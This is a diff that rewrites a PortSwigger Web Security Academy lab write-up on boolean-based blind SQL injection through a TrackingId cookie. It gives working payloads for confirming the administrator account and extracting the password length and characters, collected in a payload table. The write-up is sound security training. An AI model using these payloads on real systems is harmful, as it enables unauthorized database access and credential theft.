@@ -1,302 +1,156 @@
 # Blind SQL Injection with Conditional Responses
 
-## PortSwigger Web Security Academy
-
-**Category:** SQL Injection  
-**Lab:** Blind SQL injection with conditional responses  
-**Status:** ✅ Solved
+**Lab:** Blind SQL injection with conditional responses
+**Status:** Solved ✅
 
 ---
 
-## Lab Description
+## The setup
 
-This lab contains a blind SQL injection vulnerability.
+This lab is a step up from the error-based stuff — here the app doesn't leak anything useful directly. No error messages, no extra rows showing up. It just uses a `TrackingId` cookie to remember whether you've visited before, and that value gets dropped into a SQL query behind the scenes.
 
-The application uses a tracking cookie to determine whether a user has visited the website before. The value of this cookie is incorporated into a SQL query.
+The one thing we do get, though, is a subtle difference in how the app responds depending on whether an injected condition is true or false. That's enough. If we can turn "true vs. false" into "response A vs. response B," we've got a working oracle, and from there it's just a matter of asking the right questions.
 
-The application does not directly return database information in the response. However, the response changes depending on whether the injected SQL condition is **true or false**.
+**Goal:** use that true/false signal to pull the administrator's password out character by character, then log in.
 
-This difference can be used to perform a blind SQL injection attack and retrieve information from the database.
+## Where the hole is
 
----
-
-## Objective
-
-Exploit the blind SQL injection vulnerability to determine the password of the administrator user and log in as the administrator.
-
----
-
-## Vulnerability
-
-The application uses the `TrackingId` cookie in a SQL query without properly parameterizing the input.
-
-A vulnerable query may be conceptually similar to:
+The backend query is roughly:
 
 ```sql
 SELECT * FROM tracking
 WHERE TrackingId = 'xyz'
+```
 
-Because the TrackingId value is controlled by the client, SQL syntax can be injected into the cookie.
+Since `TrackingId` comes from a cookie we fully control, and it's not parameterized, we can inject arbitrary SQL conditions into it.
 
-The important observation is that the application behaves differently when the SQL condition evaluates to TRUE compared with when it evaluates to FALSE.
+## Step by step
 
-This allows information to be extracted one character at a time.
+**1. Grab a baseline request**
 
-Solution
-Step 1: Access the Lab
+Browse the app normally, catch a request in Burp, and you'll see a cookie like:
 
-First, open the PortSwigger Web Security Academy lab.
-
-Browse the application normally and capture a request using Burp Suite.
-
-The request contains a cookie similar to:
-
+```
 Cookie: TrackingId=xyz
+```
 
-The TrackingId cookie is the parameter that will be tested.
+That's our injection point.
 
-Step 2: Send the Request to Burp Repeater
+**2. Move it to Repeater**
 
-Send the request to Burp Suite Repeater.
+Send it over — we're going to be iterating on this cookie value a lot, so Repeater makes life easier.
 
-This makes it easier to modify the TrackingId cookie and observe changes in the response.
+**3. Test something that should be true**
 
-The original cookie looks similar to:
+Change the cookie to:
 
-TrackingId=xyz
-Step 3: Test a TRUE Condition
-
-Modify the TrackingId cookie with a SQL injection payload:
-
+```
 xyz' AND '1'='1
+```
 
-The resulting SQL query is conceptually similar to:
+Query becomes, roughly:
 
+```sql
 SELECT * FROM tracking
 WHERE TrackingId = 'xyz'
 AND '1'='1'
+```
 
-The condition:
+`'1'='1'` is always true, so the app responds exactly like it normally would. That's our "TRUE" baseline response.
 
-'1'='1'
+**4. Now test something that should be false**
 
-is TRUE.
-
-The application responds in the normal way.
-
-This confirms that the parameter may be vulnerable to SQL injection.
-
-Step 4: Test a FALSE Condition
-
-Now change the payload to:
-
+```
 xyz' AND '1'='2
+```
 
-The query becomes conceptually:
+Same query shape, except this time the condition is false — and if the app's response is visibly different from step 3 (different content, different length, missing something, whatever it happens to be), that difference is exactly what we needed. It confirms the injection point works *and* that we have a reliable way to tell true from false without seeing any actual data.
 
-SELECT * FROM tracking
-WHERE TrackingId = 'xyz'
-AND '1'='2'
+## The general pattern from here
 
-This condition is FALSE.
+Once you've got that TRUE/FALSE distinction locked in, every question you want answered gets phrased as a condition:
 
-The application's response changes compared with the TRUE condition.
-
-This difference provides a way to determine whether an injected SQL condition is true or false.
-
-Extracting Database Information
-
-Once the blind SQL injection is confirmed, the database can be queried using conditional statements.
-
-The general idea is:
-
+```
 ' AND (condition)--
+```
 
-If the condition is TRUE, the application produces the TRUE response.
+True → normal response. False → the other response. Repeat as many times as needed.
 
-If the condition is FALSE, the response changes.
+**5. Confirm the administrator account exists**
 
-Therefore, database information can be extracted one condition at a time.
-
-Step 5: Determine Whether the Administrator User Exists
-
-The users table can be queried to determine whether the administrator account exists.
-
-A conceptual query is:
-
-SELECT * FROM users
-WHERE username = 'administrator'
-
-The blind injection can test this condition:
-
+```
 ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+```
 
-If the application's TRUE response is returned, the administrator account exists.
+If you get the TRUE response back, there's an administrator account sitting in the `users` table.
 
-Determining the Password Length
+**6. Work out how long the password is**
 
-After confirming that the administrator account exists, the next step is to determine the length of the administrator's password.
+Start testing length thresholds:
 
-The following type of condition can be used:
+```
+' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 1--
+' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 2--
+' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 3--
+```
 
-' AND (SELECT LENGTH(password)
-FROM users
-WHERE username='administrator') > 1--
+Keep bumping the number up. At some point the response flips from TRUE to FALSE — that boundary tells you exactly how many characters the password has.
 
-The number can then be increased:
+**7. Pull the password out one character at a time**
 
-' AND (SELECT LENGTH(password)
-FROM users
-WHERE username='administrator') > 2--
-' AND (SELECT LENGTH(password)
-FROM users
-WHERE username='administrator') > 3--
+With the length known, go character by character using `SUBSTRING`:
 
-Continue testing different values until the TRUE/FALSE response changes.
-
-This allows the password length to be determined.
-
-Determining the Password Characters
-
-Once the password length is known, each character can be determined individually.
-
-For example, the first character can be tested using:
-
+```sql
 ' AND SUBSTRING(
     (SELECT password FROM users WHERE username='administrator'),
     1,
     1
 )='a'--
+```
 
-If the response indicates TRUE, the first character is a.
+TRUE means position 1 is `a`. If it's FALSE, try `b`, then `c`, and so on until one hits. Then move to position 2, and repeat the whole process:
 
-If it is FALSE, test another character:
-
-' AND SUBSTRING(
-    (SELECT password FROM users WHERE username='administrator'),
-    1,
-    1
-)='b'--
-
-Continue testing characters until the correct character is identified.
-
-The same process can then be repeated for:
-
-Position 1
-Position 2
-Position 3
-Position 4
-...
-
-until the complete password is recovered.
-
-Character Extraction Concept
-
-The attack works by repeatedly asking the database questions such as:
-
-Is character 1 equal to 'a'?
-Is character 1 equal to 'b'?
-Is character 1 equal to 'c'?
-
-Once the correct character is found, the process moves to the next position.
-
-For example:
-
+```
 Position 1 → ?
 Position 2 → ?
 Position 3 → ?
 Position 4 → ?
 ...
+```
 
-Eventually, the complete password can be reconstructed.
+Slow going by hand, but completely mechanical — which is exactly the kind of thing tools like sqlmap automate in the real world. Grind through every position and the full password falls out at the end.
 
-Burp Suite Workflow
+**8. Log in**
 
-The overall process used in the lab was:
+Head to the login page, drop in `administrator` and the password you just reconstructed, and you're in.
 
-Browser
-   ↓
-Capture Request
-   ↓
-Burp Suite Proxy
-   ↓
-Send Request to Repeater
-   ↓
-Identify TrackingId Cookie
-   ↓
-Test TRUE Condition
-   ↓
-Test FALSE Condition
-   ↓
-Confirm Blind SQL Injection
-   ↓
-Identify Administrator Account
-   ↓
-Determine Password Length
-   ↓
-Extract Password Characters
-   ↓
-Recover Administrator Password
-   ↓
-Login as Administrator
-Why This Attack Works
+## Payload reference
 
-The vulnerability exists because the application places the TrackingId value directly into a SQL query.
+| Purpose | Payload |
+|---|---|
+| Confirm TRUE condition | `' AND '1'='1` |
+| Confirm FALSE condition | `' AND '1'='2` |
+| Check admin account exists | `' AND (SELECT 'a' FROM users WHERE username='administrator')='a` |
+| Test password length | `' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 10--` |
+| Test a specific character | `' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--` |
 
-The attacker does not need the application to display database results directly.
+## Why this actually works
 
-Instead, the attacker observes a difference between two application responses:
+The application never needs to show us query results directly — all it needs to do is behave *differently* depending on whether the injected condition was true or false. That behavioral difference is the whole channel. Once it exists, you can ask the database an unlimited number of yes/no questions and reconstruct arbitrary data purely from the pattern of answers, without ever seeing a single row of actual output.
 
-TRUE condition  → Normal response
-FALSE condition → Different response
+## Tools used
 
-This creates a Boolean oracle.
+- Burp Suite (Proxy + Repeater)
+- Browser
 
-By repeatedly sending TRUE/FALSE questions to the database, information can be extracted without directly seeing the database query results.
+## Takeaways
 
-Example Payloads
-TRUE condition
-' AND '1'='1
-FALSE condition
-' AND '1'='2
-Check administrator account
-' AND (SELECT 'a' FROM users WHERE username='administrator')='a
-Test password length
-' AND (SELECT LENGTH(password)
-FROM users
-WHERE username='administrator') > 10--
-Test a password character
-' AND SUBSTRING(
-    (SELECT password FROM users WHERE username='administrator'),
-    1,
-    1
-)='a'--
-Tools Used
-Burp Suite
-Burp Suite Repeater
-Web Browser
-PortSwigger Web Security Academy
-Key Takeaways
-Blind SQL injection occurs when SQL query results are not directly displayed to the attacker.
-Application behavior can still reveal whether an injected SQL condition is TRUE or FALSE.
-Boolean-based blind SQL injection can be used to extract database information one character at a time.
-Cookies can be SQL injection attack surfaces just like URL parameters and form inputs.
-Password length and individual password characters can be determined through repeated conditional queries.
-Parameterized queries and prepared statements should be used to prevent SQL injection.
-Lab Status
+- Blind SQLi doesn't need visible output — a consistent behavioral difference between true and false is enough to build a full data-extraction channel.
+- Cookies are just as valid an injection surface as URL params or form fields.
+- Boolean-based extraction is slow but completely reliable, and it's exactly the kind of thing worth automating once you've confirmed it works manually.
+- Password length and content can both be pulled out purely through conditional true/false questions.
+- The fix, as always, is parameterized queries — stop building SQL by concatenating user input, and this entire attack class goes away.
 
-Status: ✅ Solved
+---
 
-Vulnerability: Blind SQL Injection
-
-Technique: Boolean-based SQL Injection
-
-Injection Point: TrackingId cookie
-
-Impact: Extraction of sensitive database information
-
-Disclaimer
-
-This write-up was created for educational and authorized security testing purposes using the PortSwigger Web Security Academy lab environment.
-
-Do not use these techniques against systems without explicit authorization.
+*Solved as part of the PortSwigger Web Security Academy — for learning/authorized testing only. Don't run this against anything you don't have permission to test.*
